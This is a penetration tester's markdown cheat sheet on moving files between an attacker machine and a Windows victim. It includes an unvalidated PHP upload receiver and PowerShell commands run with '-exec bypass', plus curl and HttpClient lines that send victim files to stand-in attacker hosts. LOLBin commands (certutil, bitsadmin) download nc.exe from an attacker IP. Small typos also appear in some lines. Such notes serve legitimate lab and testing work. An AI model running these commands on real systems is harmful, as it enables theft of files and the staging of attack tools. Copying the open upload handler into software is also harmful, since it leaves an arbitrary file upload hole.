# File transfer

## Download

source: https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

### Python

```
python -m http.server 8080
```
### Apache

```
mv somefile /var/www/html
systemctl start apache2
```

## Upload

sources: 
- https://infosecwriteups.com/tip-uploading-files-from-windows-to-kali-using-php-63aadde872a9
- https://davidhamann.de/2019/04/12/powershell-invoke-webrequest-by-example/
- https://stackoverflow.com/questions/22491129/how-to-send-multipart-form-data-with-powershell-invoke-restmethod

### Php on Kali

```
vim upload.php

<?php
  $target_dir = "uploads/";
  $target_file = $target_dir . basename($_FILES["targetfile"]["name"]);
  move_uploaded_file($_FILES["targetfile"]["tmp_name"], $target_file)
?>

mv upload.php /var/www/html

mkdir /var/www/html/uploads
chown www-data.www-data /var/www/html/uploads
chmod766 /var/www/html/uploads

systemctl start apache2
```

### On Windows

```
powershell -nop -exec bypass Invoke-RestMethod -Uri http://IpAtt/upload.php -Method Post -Infile 'c:\path\to\file.txt'
```
or
```
curl -H Content-Type:"multipart/form-data" --form targetfile=@"c:\path\to\file.txt" -X Post -v http://IpAtt/upload.php
```
or
```
$fieldName = 'targetfile' # name of the field in upload.php
$filePath = 'C:\full\path\to\file.txt' # full path...
$url = 'http://AttackerIpAddress/upload.php'

Add-Type -AssemblyName 'System.Net.Http'

$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$fileStream = [System.IO.File]::OpenRead($filePath)
$fileName = [System.IO.Path]::GetFileName($filePath)
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$content.Add($fileContent, $fieldName, $fileName)
$result = $client.PostAsync($url, $content).Result
```

### Http on Kali

```
vim upload.html

<html>
  <head></head>
  <body>
    <form action="http://IpAtt/upload.php" method="POST" enctype="multipart/form-data">
      <br><br>
      Choose a file: <br>
      <input type="file" name="targetfile"><br>
      <input type="sumbit" name="submit" value="upload">
    </form>
  </body>
</html>
```
To upload on a browser at `http://AttackerIpAddress/upload.html`

## LolBas

```
xfreerdp +clipboard /u:myuser /p:mypass /v:VictimIP
cerutils -urlcache -split -f http://AttackerApacheIP/nc.exe nc.exe
bitsadmin /create MyDownload
bitsadmin /addfile MyDownload http://AttackerIP/nc.exe C:\Users\myuser\Downloads\nc.exe
bitsadmin /resume MyDownload
bitsadmin /info MyDownload /verbose
bitsadmin /complete MyDownload

```
